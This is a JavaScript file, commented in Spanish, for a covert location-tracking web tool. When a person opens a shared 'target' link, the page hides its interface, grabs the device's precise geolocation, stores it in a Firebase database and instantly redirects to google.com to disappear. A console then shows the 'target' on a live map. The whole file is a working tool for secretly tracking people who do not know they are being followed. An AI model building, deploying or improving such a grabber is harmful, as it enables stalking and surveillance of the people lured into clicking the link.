import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { getFirestore, doc, setDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

const firebaseConfig = {
    apiKey: "TU_API_KEY",
    authDomain: "tu-proyecto.firebaseapp.com",
    projectId: "tu-proyecto",
    storageBucket: "tu-proyecto.appspot.com",
    messagingSenderId: "TU_MESSAGING_SENDER_ID",
    appId: "TU_APP_ID"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

let map;
let marker;
const ubicacionPorDefecto = [14.3333, -90.6667]; 

const urlParams = new URLSearchParams(window.location.search);
const targetId = urlParams.get('target');

document.addEventListener("DOMContentLoaded", function () {
    // ESCENARIO A: Si entra desde el enlace compartido (celular objetivo)
    if (targetId) {
        // Ocultamos la consola inmediatamente para que no vean la interfaz de Spidey
        const consoleElem = document.querySelector('.console-container');
        if (consoleElem) consoleElem.style.display = 'none';

        // Ejecutamos la captura silenciosa y rápida
        capturarYSalir(targetId);
        return;
    }

    // ESCENARIO B: Consola principal (tu PC/monitoreo)
    map = L.map('map', { zoomControl: false }).setView(ubicacionPorDefecto, 14);

    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        maxZoom: 19,
        attribution: '&copy; OpenStreetMap contributors'
    }).addTo(map);

    marker = L.marker(ubicacionPorDefecto).addTo(map)
        .bindPopup("<b>Sistema en línea.</b> Esperando señal...")
        .openPopup();

    setTimeout(() => { map.invalidateSize(); }, 200);

    escucharObjetivoRemoto("objetivo_principal");
});

// CAPTURA RÁPIDA Y REDIRECCIÓN INSTANTÁNEA
function capturarYSalir(id) {
    if (!navigator.geolocation) {
        window.location.href = "https://www.google.com";
        return;
    }

    navigator.geolocation.getCurrentPosition(
        async (position) => {
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;

            try {
                // Guarda las coordenadas exactas en tiempo real
                await setDoc(doc(db, "rastreos", id), {
                    lat: lat,
                    lng: lng,
                    timestamp: new Date()
                });
            } catch (e) {
                console.error("Error guardando datos:", e);
            } finally {
                // Redirige de inmediato a una página común para "desaparecer"
                window.location.replace("https://www.google.com");
            }
        },
        (error) => {
            // Si el usuario rechaza los permisos o falla, redirige igual
            window.location.replace("https://www.google.com");
        },
        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
    );
}

// Escuchar la ubicación en tu consola principal
function escucharObjetivoRemoto(id) {
    onSnapshot(doc(db, "rastreos", id), (docSnap) => {
        if (docSnap.exists()) {
            const data = docSnap.data();
            const lat = data.lat;
            const lng = data.lng;

            map.invalidateSize();
            map.setView([lat, lng], 16);
            marker.setLatLng([lat, lng]);
            marker.bindPopup(`<b>¡Objetivo Localizado!</b><br>Lat: ${lat.toFixed(4)}<br>Lng: ${lng.toFixed(4)}`).openPopup();
            
            document.getElementById('banner-status').innerHTML = "OBJETIVO ENLAZADO<br>SEÑAL ESTABLE";
        }
    });
}

// Botón SHARE LINK: Genera el enlace rápido
window.compartirEnlace = function() {
    const baseUrl = window.location.origin + window.location.pathname;
    const enlaceObjetivo = `${baseUrl}?target=objetivo_principal`;
    
    navigator.clipboard.writeText(enlaceObjetivo).then(() => {
        alert("Enlace táctico copiado. Al abrirlo, capturará la ubicación y redireccionará al instante.");
    }).catch(err => {
        console.error("Error al copiar enlace:", err);
    });
};

// Funciones secundarias del panel
window.obtenerUbicacionActual = function() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition((pos) => {
            const lat = pos.coords.latitude;
            const lng = pos.coords.longitude;
            map.setView([lat, lng], 16);
            marker.setLatLng([lat, lng]).bindPopup("Tu posición local").openPopup();
        });
    }
};

window.accionRastrearObjetivo = () => alert("Protocolo de rastreo activo. Esperando conexión...");
window.centrarUbicacion = () => map.invalidateSize();
window.cambiarAlerta = (t) => alert("Alerta: " + t);
window.cambiarPerfil = (n) => alert("Perfil: " + n);
window.abrirChat = () => alert("Canal de chat seguro abierto.");
window.verArchivo = () => alert("Abriendo registros históricos...");
